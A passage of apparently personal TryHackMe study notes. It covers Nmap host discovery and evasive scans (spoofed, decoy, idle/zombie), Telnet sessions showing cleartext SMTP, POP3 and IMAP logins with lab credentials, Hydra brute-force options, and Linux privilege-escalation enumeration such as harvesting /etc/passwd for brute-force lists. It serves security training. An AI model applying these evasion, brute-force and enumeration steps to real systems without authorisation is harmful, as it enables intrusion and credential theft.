<td><code>sudo nmap -PU53,161,162 -sn MACHINE_IP/30</code></td>
</tr>
</tbody></table>
<p>Remember to add <code>-sn</code> if you are only interested in host discovery without port-scanning. Omitting <code>-sn</code> will let Nmap default to port-scanning the live hosts.</p>
<table>
<thead>
<tr>
<th>Option</th>
<th>Purpose</th>
</tr>
</thead>
<tbody><tr>
<td><code>-n</code></td>
<td>no DNS lookup</td>
</tr>
<tr>
<td><code>-R</code></td>
<td>reverse-DNS lookup for all hosts</td>
</tr>
<tr>
<td><code>-sn</code></td>
<td>host discovery only</td>
</tr>
</tbody></table>
<h3 id="Nmap-Basic-Port-Scans"><a href="#Nmap-Basic-Port-Scans" class="headerlink" title="Nmap Basic Port Scans"></a>Nmap Basic Port Scans</h3><p>At the risk of oversimplification, we can classify ports in two states:</p>
<ol>
<li>Open port indicates that there is some service listening on that port.</li>
<li>Closed port indicates that there is no service listening on that port.</li>
</ol>
<p>However, in practical situations, we need to consider the impact of firewalls. For instance, a port might be open, but a firewall might be blocking the packets. Therefore, Nmap considers the following six states:</p>
<ol>
<li><p><strong>Open</strong>: indicates that a service is listening on the specified port.</p>
</li>
<li><p><strong>Closed</strong>: indicates that no service is listening on the specified port, although the port is accessible. By accessible, we mean that it is reachable and is not blocked by a firewall or other security appliances&#x2F;programs.</p>
</li>
<li><p><strong>Filtered</strong>: means that Nmap cannot determine if the port is open or closed because the port is not accessible. This state is usually due to a firewall preventing Nmap from reaching that port. Nmap’s packets may be blocked from reaching the port; alternatively, the responses are blocked from reaching Nmap’s host.</p>
</li>
<li><p><strong>Unfiltered</strong>: means that Nmap cannot determine if the port is open or closed, although the port is accessible. This state is encountered when using an ACK scan <code>-sA</code>.</p>
</li>
<li><p><strong>Open|Filtered</strong>: This means that Nmap cannot determine whether the port is open or filtered.</p>
</li>
<li><p><strong>Closed|Filtered</strong>: This means that Nmap cannot decide whether a port is closed or filtered.</p>
<p>Which service uses UDP port 53 by default?</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns</span><br></pre></td></tr></table></figure>

<p>Which service uses TCP port 22 by default?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221207162942368.png" alt="image-20221207162942368"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT ip</span><br><span class="line">nmap -sY ip</span><br><span class="line">nmap -sU ip</span><br></pre></td></tr></table></figure>

<p> <strong>Idle&#x2F;Zombie Scan</strong></p>
<p>Spoofing the source IP address can be a great approach to scanning stealthily. However, spoofing will only work in specific network setups. It requires you to be in a position where you can monitor the traffic. Considering these limitations, spoofing your IP address can have little use; however, we can give it an upgrade with the idle scan.</p>
<p>The idle scan, or zombie scan, requires an idle system connected to the network that you can communicate with. Practically, Nmap will make each probe appear as if coming from the idle (zombie) host, then it will check for indicators whether the idle (zombie) host received any response to the spoofed probe. This is accomplished by checking the IP identification (IP ID) value in the IP header. You can run an idle scan using <code>nmap -sI ZOMBIE_IP MACHINE_IP</code>, where <code>ZOMBIE_IP</code> is the IP address of the idle host (zombie).</p>
<p>The idle (zombie) scan requires the following three steps to discover whether a port is open:</p>
<ol>
<li>Trigger the idle host to respond so that you can record the current IP ID on the idle host.</li>
<li>Send a SYN packet to a TCP port on the target. The packet should be spoofed to appear as if it was coming from the idle host (zombie) IP address.</li>
<li>Trigger the idle machine again to respond so that you can compare the new IP ID with the one received earlier.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-sI 10.10.5.5</span><br></pre></td></tr></table></figure>

<p>This room covered the following types of scans.</p>
<table>
<thead>
<tr>
<th>Port Scan Type</th>
<th>Example Command</th>
</tr>
</thead>
<tbody><tr>
<td>TCP Null Scan</td>
<td><code>sudo nmap -sN MACHINE_IP</code></td>
</tr>
<tr>
<td>TCP FIN Scan</td>
<td><code>sudo nmap -sF MACHINE_IP</code></td>
</tr>
<tr>
<td>TCP Xmas Scan</td>
<td><code>sudo nmap -sX MACHINE_IP</code></td>
</tr>
<tr>
<td>TCP Maimon Scan</td>
<td><code>sudo nmap -sM MACHINE_IP</code></td>
</tr>
<tr>
<td>TCP ACK Scan</td>
<td><code>sudo nmap -sA MACHINE_IP</code></td>
</tr>
<tr>
<td>TCP Window Scan</td>
<td><code>sudo nmap -sW MACHINE_IP</code></td>
</tr>
<tr>
<td>Custom TCP Scan</td>
<td><code>sudo nmap --scanflags URGACKPSHRSTSYNFIN MACHINE_IP</code></td>
</tr>
<tr>
<td>Spoofed Source IP</td>
<td><code>sudo nmap -S SPOOFED_IP MACHINE_IP</code></td>
</tr>
<tr>
<td>Spoofed MAC Address</td>
<td><code>--spoof-mac SPOOFED_MAC</code></td>
</tr>
<tr>
<td>Decoy Scan</td>
<td><code>nmap -D DECOY_IP,ME MACHINE_IP</code></td>
</tr>
<tr>
<td>Idle (Zombie) Scan</td>
<td><code>sudo nmap -sI ZOMBIE_IP MACHINE_IP</code></td>
</tr>
<tr>
<td>Fragment IP data into 8 bytes</td>
<td><code>-f</code></td>
</tr>
<tr>
<td>Fragment IP data into 16 bytes</td>
<td><code>-ff</code></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>Option</th>
<th>Purpose</th>
</tr>
</thead>
<tbody><tr>
<td><code>--source-port PORT_NUM</code></td>
<td>specify source port number</td>
</tr>
<tr>
<td><code>--data-length NUM</code></td>
<td>append random data to reach given length</td>
</tr>
</tbody></table>
<p>These scan types rely on setting TCP flags in unexpected ways to prompt ports for a reply. Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports.</p>
<table>
<thead>
<tr>
<th>Option</th>
<th>Purpose</th>
</tr>
</thead>
<tbody><tr>
<td><code>--reason</code></td>
<td>explains how Nmap made its conclusion</td>
</tr>
<tr>
<td><code>-v</code></td>
<td>verbose</td>
</tr>
<tr>
<td><code>-vv</code></td>
<td>very verbose</td>
</tr>
<tr>
<td><code>-d</code></td>
<td>debugging</td>
</tr>
<tr>
<td><code>-dd</code></td>
<td>more details for debugging</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>Option</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td><code>-sV</code></td>
<td>determine service&#x2F;version info on open ports</td>
</tr>
<tr>
<td><code>-sV --version-light</code></td>
<td>try the most likely probes (2)</td>
</tr>
<tr>
<td><code>-sV --version-all</code></td>
<td>try all available probes (9)</td>
</tr>
<tr>
<td><code>-O</code></td>
<td>detect OS</td>
</tr>
<tr>
<td><code>--traceroute</code></td>
<td>run traceroute to target</td>
</tr>
<tr>
<td><code>--script=SCRIPTS</code></td>
<td>Nmap scripts to run</td>
</tr>
<tr>
<td><code>-sC</code> or <code>--script=default</code></td>
<td>run default scripts</td>
</tr>
<tr>
<td><code>-A</code></td>
<td>equivalent to <code>-sV -O -sC --traceroute</code></td>
</tr>
<tr>
<td><code>-oN</code></td>
<td>save output in normal format</td>
</tr>
<tr>
<td><code>-oG</code></td>
<td>save output in grepable format</td>
</tr>
<tr>
<td><code>-oX</code></td>
<td>save output in XML format</td>
</tr>
<tr>
<td><code>-oA</code></td>
<td>save output in normal, XML and Grepable formats</td>
</tr>
</tbody></table>
<h3 id="Protocols-and-Servers"><a href="#Protocols-and-Servers" class="headerlink" title="Protocols and Servers"></a>Protocols and Servers</h3><p><strong>Telnet</strong>    23</p>
<p>The Telnet protocol is an application layer protocol used to connect to a virtual terminal of another computer. Using Telnet, a user can log into another computer and access its terminal (console) to run programs, start batch processes, and perform system administration tasks remotely.</p>
<p>Telnet protocol is relatively simple. When a user connects, they will be asked for a username and password. Upon correct authentication, the user will access the remote system’s terminal. Unfortunately, all this communication between the Telnet client and the Telnet server is not encrypted, making it an easy target for attackers.</p>
<p>A Telnet server uses the Telnet protocol to listen for incoming connections on port 23. (Please note that the Telnet port is not open on the target VM.) Let’s consider the example shown below. A user is connecting to the <code>telnetd</code>, a Telnet server. </p>
<p>Although Telnet gave us access to the remote system’s terminal in no time, it is not a reliable protocol for remote administration as all the data are sent in cleartext. In the figure below, we captured the traffic generated by Telnet, and it was so easy to find the password. The figure below shows the ASCII data exchanged between our computer and the remote system. The text in red is the text that we are sending to the remote system, while the text in blue is the text that the remote system is sending. Notice how the user name was sent back (echoed at us to display them in our terminal); however, the password was not. In other words, if someone is watching us type, they won’t be able to see the password characters on the screen.</p>
<p>Telnet is no longer considered a secure option, especially that anyone capturing your network traffic will be able to discover your usernames and passwords, which would grant them access to the remote system. The secure alternative is SSH, which we present in the next room.</p>
<p><strong>HTTP</strong>       80</p>
<p>Hypertext Transfer Protocol (HTTP) is the protocol used to transfer web pages. Your web browser connects to the webserver and uses HTTP to request HTML pages and images among other files and submit forms and upload various files. Anytime you browse the World Wide Web (WWW), you are certainly using the HTTP protocol.</p>
<p>HTTP sends and receives data as cleartext (not encrypted); therefore, you can use a simple tool, such as Telnet (or Netcat), to communicate with a web server and act as a “web browser”. The key difference is that you need to input the HTTP-related commands instead of the web browser doing that for you.</p>
<p>In the following example, we will see how we can request a page from a web server; moreover, we will discover the webserver version. To accomplish this, we will use the Telnet client. We chose it because Telnet is a simple protocol; furthermore, it uses cleartext for communication. We will use <code>telnet</code> instead of a web browser to request a file from the webserver.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.10.46.76 80</span><br><span class="line"></span><br><span class="line">GET /flag.thm HTTP/1.1</span><br><span class="line">host: telnet</span><br></pre></td></tr></table></figure>

<p><strong>FTP</strong>           20</p>
<p>File Transfer Protocol (FTP) was developed to make the transfer of files between different computers with different systems efficient.</p>
<p>FTP also sends and receives data as cleartext; therefore, we can use Telnet (or Netcat) to communicate with an FTP server and act as an FTP client. </p>
<p>A command like <code>STAT</code> can provide some added information. The <code>SYST</code> command shows the System Type of the target (UNIX in this case). <code>PASV</code> switches the mode to passive. It is worth noting that there are two modes for FTP:</p>
<ul>
<li>Active: In the active mode, the data is sent over a separate channel originating from the FTP server’s port 20.</li>
<li>Passive: In the passive mode, the data is sent over a separate channel originating from an FTP client’s port above port number 1023.</li>
</ul>
<p>The command <code>TYPE A</code> switches the file transfer mode to ASCII, while <code>TYPE I</code> switches the file transfer mode to binary. However, we cannot transfer a file using a simple client such as Telnet because FTP creates a separate connection for file transfer.</p>
<p><strong>SMTP</strong>             25</p>
<p>Email is one of the most used services on the Internet. There are various configurations for email servers; for instance, you may set up an email system to allow local users to exchange emails with each other with no access to the Internet. However, we will consider the more general setup where different email servers connect over the Internet.</p>
<p>Email delivery over the Internet requires the following components:</p>
<ol>
<li>Mail Submission Agent (MSA)</li>
<li>Mail Transfer Agent (MTA)</li>
<li>Mail Delivery Agent (MDA)</li>
<li>Mail User Agent (MUA)</li>
</ol>
<p>The above four terms may look cryptic, but they are more straightforward than they appear. We will explain these terms using the figure below.</p>
<p>The figure shows the following five steps that an email needs to go through to reach the recipient’s inbox:</p>
<ol>
<li>A Mail User Agent (MUA), or simply an email client, has an email message to be sent. The MUA connects to a Mail Submission Agent (MSA) to send its message.</li>
<li>The MSA receives the message, checks for any errors before transferring it to the Mail Transfer Agent (MTA) server, commonly hosted on the same server.</li>
<li>The MTA will send the email message to the MTA of the recipient. The MTA can also function as a Mail Submission Agent (MSA).</li>
<li>A typical setup would have the MTA server also functioning as a Mail Delivery Agent (MDA).</li>
<li>The recipient will collect its email from the MDA using their email client.</li>
</ol>
<p>If the above steps sound confusing, consider the following analogy:</p>
<ol>
<li>You (MUA) want to send postal mail.</li>
<li>The post office employee (MSA) checks the postal mail for any issues before your local post office (MTA) accepts it.</li>
<li>The local post office checks the mail destination and sends it to the post office (MTA) in the correct country.</li>
<li>The post office (MTA) delivers the mail to the recipient mailbox (MDA).</li>
<li>The recipient (MUA) regularly checks the mailbox for new mail. They notice the new mail, and they take it.</li>
</ol>
<p>In the same way, we need to follow a protocol to communicate with an HTTP server, and we need to rely on email protocols to talk with an MTA and an MDA. The protocols are:</p>
<ol>
<li>Simple Mail Transfer Protocol (SMTP)</li>
<li>Post Office Protocol version 3 (POP3) or Internet Message Access Protocol (IMAP)</li>
</ol>
<p>We explain SMTP in this task and elaborate on POP3 and IMAP in the following two tasks.</p>
<p>Simple Mail Transfer Protocol (SMTP) is used to communicate with an MTA server. Because SMTP uses cleartext, where all commands are sent without encryption, we can use a basic Telnet client to connect to an SMTP server and act as an email client (MUA) sending a message.</p>
<p>SMTP server listens on port 25 by default. To see basic communication with an SMTP server, we used Telnet to connect to it. Once connected, we issue <code>helo hostname</code> and then start typing our email.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ telnet 10.10.46.76 25</span><br><span class="line">Trying 10.10.46.76...</span><br><span class="line">Connected to MACHINE_IP.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">220 bento.localdomain ESMTP Postfix (Ubuntu)</span><br><span class="line">helo telnet</span><br><span class="line">250 bento.localdomain</span><br><span class="line">mail from: </span><br><span class="line">250 2.1.0 Ok</span><br><span class="line">rcpt to: </span><br><span class="line">250 2.1.5 Ok</span><br><span class="line">data</span><br><span class="line">354 End data with .</span><br><span class="line">subject: Sending email with Telnet</span><br><span class="line">Hello Frank,</span><br><span class="line">I am just writing to say hi!             </span><br><span class="line">.</span><br><span class="line">250 2.0.0 Ok: queued as C3E7F45F06</span><br><span class="line">quit</span><br><span class="line">221 2.0.0 Bye</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>

<p>After <code>helo</code>, we issue <code>mail from:</code>, <code>rcpt to:</code> to indicate the sender and the recipient. When we send our email message, we issue the command <code>data</code> and type our message. We issue <code>&lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</code> (or <code>Enter . Enter</code> to put it in simpler terms). The SMTP server now queues the message.</p>
<p>Generally speaking, we don’t need to memorize SMTP commands. The console output above aims to help better explain what a typical mail client does when it uses SMTP.</p>
<p><strong>POP3</strong>            110</p>
<p>Post Office Protocol version 3 (POP3) is a protocol used to download the email messages from a Mail Delivery Agent (MDA) server, as shown in the figure below. The mail client connects to the POP3 server, authenticates, downloads the new email messages before (optionally) deleting them.</p>
<p>The example below shows what a POP3 session would look like if conducted via a Telnet client. First, the user connects to the POP3 server at the POP3 default port 110. Authentication is required to access the email messages; the user authenticates by providing his username <code>USER frank</code> and password <code>PASS D2xc9CgD</code>. Using the command <code>STAT</code>, we get the reply <code>+OK 1 179</code>; based on <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc1939">RFC 1939</a>, a positive response to <code>STAT</code> has the format <code>+OK nn mm</code>, where <em>nn</em> is the number of email messages in the inbox, and <em>mm</em> is the size of the inbox in octets (byte). The command <code>LIST</code> provided a list of new messages on the server, and <code>RETR 1</code> retrieved the first message in the list. We don’t need to concern ourselves with memorizing these commands; however, it is helpful to strengthen our understanding of such protocol.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ telnet 10.10.46.76 110</span><br><span class="line">Trying 10.10.46.76...</span><br><span class="line">Connected to MACHINE_IP.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">+OK MACHINE_IP Mail Server POP3 Wed, 15 Sep 2021 11:05:34 +0300 </span><br><span class="line">USER frank</span><br><span class="line">+OK frank</span><br><span class="line">PASS D2xc9CgD</span><br><span class="line">+OK 1 messages (179) octets</span><br><span class="line">STAT</span><br><span class="line">+OK 1 179</span><br><span class="line">LIST</span><br><span class="line">+OK 1 messages (179) octets</span><br><span class="line">1 179</span><br><span class="line">.</span><br><span class="line">RETR 1</span><br><span class="line">+OK</span><br><span class="line">From: Mail Server </span><br><span class="line">To: Frank </span><br><span class="line">subject: Sending email with Telnet</span><br><span class="line">Hello Frank,</span><br><span class="line">I am just writing to say hi!</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">+OK MACHINE_IP closing connection</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>

<p>The example above shows that the commands are sent in cleartext. Using Telnet was enough to authenticate and retrieve an email message. As the username and password are sent in cleartext, any third party watching the network traffic can steal the login credentials.</p>
<p>In general, your mail client (MUA) will connect to the POP3 server (MDA), authenticate, and download the messages. Although the communication using the POP3 protocol will be hidden behind a sleek interface, similar commands will be issued, as shown in the Telnet session above.</p>
<p>Based on the default settings, the mail client deletes the mail message after it downloads it. The default behaviour can be changed from the mail client settings if you wish to download the emails again from another mail client. Accessing the same mail account via multiple clients using POP3 is usually not very convenient as one would lose track of read and unread messages. To keep all mailboxes synchronized, we need to consider other protocols, such as IMAP.</p>
<p>**IMAP **            143</p>
<p>Internet Message Access Protocol (IMAP) is more sophisticated than POP3. IMAP makes it possible to keep your email synchronized across multiple devices (and mail clients). In other words, if you mark an email message as read when checking your email on your smartphone, the change will be saved on the IMAP server (MDA) and replicated on your laptop when you synchronize your inbox.</p>
<p>Let’s take a look at sample IMAP commands. In the console output below, we use Telnet to connect to the IMAP server’s default port, and then we authenticate using <code>LOGIN username password</code>. IMAP requires each command to be preceded by a random string to be able to track the reply. So we added <code>c1</code>, then <code>c2</code>, and so on. Then we listed our mail folders using <code>LIST &quot;&quot; &quot;*&quot;</code>, before checking if we have any new messages in the inbox using <code>EXAMINE INBOX</code>. We don’t need to memorize these commands; however, we are simply providing the example below to give a vivid image of what happens when the mail client communicates with an IMAP server.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ telnet 10.10.46.76 143</span><br><span class="line">Trying 10.10.46.76...</span><br><span class="line">Connected to MACHINE_IP.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.</span><br><span class="line">c1 LOGIN frank D2xc9CgD</span><br><span class="line">* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)</span><br><span class="line">c1 OK LOGIN Ok.                                  --------------------</span><br><span class="line">c2 LIST &quot;&quot; &quot;*&quot;                                   --------------------</span><br><span class="line">* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Trash&quot;</span><br><span class="line">* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Drafts&quot;</span><br><span class="line">* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Templates&quot;</span><br><span class="line">* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Sent&quot;</span><br><span class="line">* LIST (\Unmarked \HasChildren) &quot;.&quot; &quot;INBOX&quot;</span><br><span class="line">c2 OK LIST completed                                   </span><br><span class="line">c3 EXAMINE INBOX                                      -----------------------</span><br><span class="line">* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)</span><br><span class="line">* OK [PERMANENTFLAGS ()] No permanent flags permitted</span><br><span class="line">* 0 EXISTS</span><br><span class="line">* 0 RECENT</span><br><span class="line">* OK [UIDVALIDITY 631694851] Ok</span><br><span class="line">* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL</span><br><span class="line">c3 OK [READ-ONLY] Ok</span><br><span class="line">c4 LOGOUT                                               ----------------</span><br><span class="line">* BYE Courier-IMAP server shutting down</span><br><span class="line">c4 OK LOGOUT completed</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>

<p>It is clear that IMAP sends the login credentials in cleartext, as we can see in the command <code>LOGIN frank D2xc9CgD</code>. Anyone watching the network traffic would be able to know Frank’s username and password.</p>
<p>It is good to remember the default port number for common protocols. For convenience, the services we covered are listed in the following table sorted by alphabetical order.</p>
<table>
<thead>
<tr>
<th>Protocol</th>
<th>TCP Port</th>
<th>Application(s)</th>
<th>Data Security</th>
</tr>
</thead>
<tbody><tr>
<td>FTP</td>
<td>21</td>
<td>File Transfer</td>
<td>Cleartext</td>
</tr>
<tr>
<td>FTPS</td>
<td>990</td>
<td>File Transfer</td>
<td>Encrypted</td>
</tr>
<tr>
<td>HTTP</td>
<td>80</td>
<td>Worldwide Web</td>
<td>Cleartext</td>
</tr>
<tr>
<td>HTTPS</td>
<td>443</td>
<td>Worldwide Web</td>
<td>Encrypted</td>
</tr>
<tr>
<td>IMAP</td>
<td>143</td>
<td>Email (MDA)</td>
<td>Cleartext</td>
</tr>
<tr>
<td>IMAPS</td>
<td>993</td>
<td>Email (MDA)</td>
<td>Encrypted</td>
</tr>
<tr>
<td>POP3</td>
<td>110</td>
<td>Email (MDA)</td>
<td>Cleartext</td>
</tr>
<tr>
<td>POP3S</td>
<td>995</td>
<td>Email (MDA)</td>
<td>Encrypted</td>
</tr>
<tr>
<td>SFTP</td>
<td>22</td>
<td>File Transfer</td>
<td>Encrypted</td>
</tr>
<tr>
<td>SSH</td>
<td>22</td>
<td>Remote Access and File Transfer</td>
<td>Encrypted</td>
</tr>
<tr>
<td>SMTP</td>
<td>25</td>
<td>Email (MTA)</td>
<td>Cleartext</td>
</tr>
<tr>
<td>SMTPS</td>
<td>465</td>
<td>Email (MTA)</td>
<td>Encrypted</td>
</tr>
<tr>
<td>Telnet</td>
<td>23</td>
<td>Remote Access</td>
<td>Cleartext</td>
</tr>
</tbody></table>
<p>Hydra remains a very efficient tool that you can launch from the terminal to try the different passwords. We summarize its main options in the following table.</p>
<table>
<thead>
<tr>
<th>Option</th>
<th>Explanation</th>
</tr>
</thead>
<tbody><tr>
<td><code>-l username</code></td>
<td>Provide the login name</td>
</tr>
<tr>
<td><code>-P WordList.txt</code></td>
<td>Specify the password list to use</td>
</tr>
<tr>
<td><code>server service</code></td>
<td>Set the server address and service to attack</td>
</tr>
<tr>
<td><code>-s PORT</code></td>
<td>Use in case of non-default service port number</td>
</tr>
<tr>
<td><code>-V</code> or <code>-vV</code></td>
<td>Show the username and password combinations being tried</td>
</tr>
<tr>
<td><code>-d</code></td>
<td>Display debugging output if the verbose output is not helping</td>
</tr>
</tbody></table>
<h1 id="Linux-Privilege-Escalation"><a href="#Linux-Privilege-Escalation" class="headerlink" title="Linux Privilege Escalation"></a>Linux Privilege Escalation</h1><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p><strong>hostname</strong></p>
<p>The <code>hostname</code> command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).</p>
<p><strong>uname -a</strong></p>
<p>Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.</p>
<p><strong>&#x2F;proc&#x2F;version</strong></p>
<p>The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.</p>
<p>Looking at <code>/proc/version</code> may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.</p>
<p><strong>&#x2F;etc&#x2F;issue</strong></p>
<p>Systems can also be identified by looking at the <code>/etc/issue</code> file. This file usually contains some information about the operating system but can easily be customized or changes. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.</p>
<p><strong>ps Command</strong></p>
<p>The <code>ps</code> command is an effective way to see the running processes on a Linux system. Typing <code>ps</code> on your terminal will show processes for the current shell.</p>
<p>The output of the <code>ps</code> (Process Status) will show the following;</p>
<ul>
<li>PID: The process ID (unique to the process)</li>
<li>TTY: Terminal type used by the user</li>
<li>Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)</li>
<li>CMD: The command or executable running (will NOT display any command line parameter)</li>
</ul>
<p>The “ps” command provides a few useful options.</p>
<ul>
<li><p><code>ps -A</code>: View all running processes</p>
</li>
<li><p><code>ps axjf</code>: View process tree (see the tree formation until <code>ps axjf</code> is run below)</p>
</li>
<li><p><code>ps aux</code>: The <code>aux</code> option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.</p>
</li>
</ul>
<p><strong>env</strong></p>
<p>The <code>env</code> command will show environmental variables.</p>
<p>The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.</p>
<p><strong>sudo -l</strong></p>
<p>The target system may be configured to allow users to run some (or all) commands with root privileges. The <code>sudo -l</code> command can be used to list all commands your user can run using <code>sudo</code>.</p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<p><strong>ls</strong></p>
<p>One of the common commands used in Linux is probably <code>ls</code>.</p>
<p>While looking for potential privilege escalation vectors, please remember to always use the <code>ls</code> command with the <code>-la</code> parameter. The example below shows how the “secret.txt” file can easily be missed using the <code>ls</code> or <code>ls -l</code> commands.</p>
<p><strong>Id</strong></p>
<p>The <code>id</code> command will provide a general overview of the user’s privilege level and group memberships.</p>
<p>It is worth remembering that the <code>id</code> command can also be used to obtain the same information for another user as seen below.</p>
<p><strong>&#x2F;etc&#x2F;passwd</strong></p>
<p>Reading the <code>/etc/passwd</code> file can be an easy way to discover users on the system.</p>
<p>While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks.</p>
<p>Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.</p>
<p><strong>history</strong></p>
<p>Looking at earlier commands with the <code>history</code> command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.</p>
<p><strong>ifconfig</strong></p>
<p>The target system may be a pivoting point to another network. The <code>ifconfig</code> command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks.</p>
<p>This can be confirmed using the <code>ip route</code> command to see which network routes exist.</p>
<p><strong>netstat</strong></p>
<p>Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The <code>netstat</code> command can be used with several different options to gather information on existing connections.</p>
<ul>
<li><code>netstat -a</code>: shows all listening ports and established connections.</li>
<li><code>netstat -at</code> or <code>netstat -au</code> can also be used to list TCP or UDP protocols respectively.</li>
<li><code>netstat -l</code>: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)</li>
<li><code>netstat -s</code>: list network usage statistics by protocol (below) This can also be used with the <code>-t</code> or <code>-u</code> options to limit the output to a specific protocol.</li>
<li><code>netstat -tp</code>: list connections with the service name and PID information.</li>
<li>This can also be used with the <code>-l</code> option to list listening ports (below)</li>
<li><code>netstat -i</code>: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.</li>
</ul>
<p>The <code>netstat</code> usage you will probably see most often in blog posts, write-ups, and courses is <code>netstat -ano</code> which could be broken down as follows;</p>
<p>​		<code>-a</code>: Display all sockets</p>
<p>​		<code>-n</code>: Do not resolve names</p>
<p>​		<code>-o</code>: Display timers</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anop</span><br></pre></td></tr></table></figure>

<p><strong>find Command</strong></p>
<p>Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.</p>
<p>Below are some useful examples for the “find” command.</p>
<p>Find files:</p>
